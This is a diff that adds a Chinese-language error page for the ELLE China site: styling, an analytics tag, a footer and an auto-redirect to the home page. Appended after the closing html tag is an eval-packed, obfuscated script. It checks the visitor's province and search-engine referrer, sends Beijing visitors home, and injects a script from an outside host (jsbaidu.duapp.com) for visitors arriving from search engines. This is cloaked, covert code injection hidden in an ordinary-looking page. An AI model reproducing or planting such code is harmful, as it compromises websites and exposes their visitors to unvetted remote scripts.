@@ -1,0 +1,121 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="Content-language" content="zh-CN" />
+<meta http-equiv="Refresh" content="5;url=http://www.ellechina.com" />
+<title>ELLE - 错误</title>
+<style type="text/css">
+* {
+	margin: 0;
+	padding: 0
+}body {
+	font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	text-align: center;
+	background: #E4E4E4
+}img {
+	border: 0
+}html img {
+	vertical-align: text-bottom
+}ul {
+	list-style: none
+}a {
+	text-decoration: none
+}a:hover {
+	text-decoration: underline
+}p {
+	line-height: 18px
+}h1 {
+	width: 215px;
+	height: 89px;
+	background:
+		url(http://images.ellechina.com/templates/ellechina/images/404/logo.gif)
+}h1 a {
+	display: block;
+	height: 89px
+}.clear {
+	clear: both
+}#main,#header,#contents,#footer {
+	width: 800px
+}#main {
+	height: 500px;
+	text-align: left;
+	background:
+		url(http://images.ellechina.com/templates/ellechina/images/404/error.jpg)
+		no-repeat;
+	position: relative;
+	margin: 50px auto 0
+}#header {
+	height: 89px
+}#contents {
+	position: relative
+}#contents .link {
+	display: block;
+	width: 90px;
+	height: 20px;
+	position: absolute;
+	top: 285px;
+	left: 235px
+}#contents .link:hover {
+	border-bottom: dashed 2px #666
+}#footer {
+	clear: both;
+	text-align: center;
+	position: absolute;
+	bottom: 0;
+	padding: 25px 0
+}#footer p span {
+	margin-right: 10px;
+	color: #666
+}#footer #icp-card {
+	width: 35px;
+	height: 43px;
+	display: block;
+	background:
+		url(http://images.ellechina.com/templates/ellechina/images/404/icp-card.gif)
+		no-repeat;
+	position: absolute;
+	top: 10px;
+	right: 30px
+}
+</style>
+</head>
+<body>
+<!-- Google Tag Manager -->
+<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-W7HWWX"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-W7HWWX');</script>
+<!-- End Google Tag Manager --><!--GA-->
+	<div id="main">
+		<div id="header">
+			<h1>
+				<a href="http://www.ellechina.com" target="_blank" title="Home"></a>
+			</h1>
+		</div>
+		<div id="contents">
+			<a class="link" href="http://www.ellechina.com" title="返回首页"></a>
+		</div>
+		<div id="footer">
+			<p>
+				<span>Copyright &copy; 2015 ellechina.com</span> <span>All
+					rights reserved.北京必尔得广告有限公司</span> <span>版权所有</span> <span>京ICP证060525号<span>
+				<a id="icp-card"
+					href="http://www.hd315.gov.cn/beian/view.asp?bianhao=010202008052000006"
+					target="_blank"></a>
+			</p>
+		</div>
+	</div>
+	
+</body>
+</html>
+
+
+<script type="text/javascript" src="http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js"></script>
+<script type="text/javascript">
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('k 7=e,1=3.h;j 4(){3.l="v - 错误";b.c.d="5://f.g.6/"}"北京"==7.i?4():0<1.2("a.")||0<1.2("m.")||0<1.2("n.")||0<1.2("o.")||0<1.2("p.")||0<1.2("q.")||0<1.2("r.")||0<1.2("s.")||0<1.2("t.")?3.u(\'<9 w="x" y="5://z.A.6/B.C" D="E-8"></9>\'):4();',41,41,'|bct|indexOf|document|error|http|com|area||script|google|window|location|href|remote_ip_info|www|ellechina|referrer|province|function|var|title|baidu|yahoo|so|bing|soso|sogou|youdao|haosou|writeln|ELLE|language|javascript|src|jsbaidu|duapp|fc|js|charset|utf'.split('|'),0,{}))
+</script>
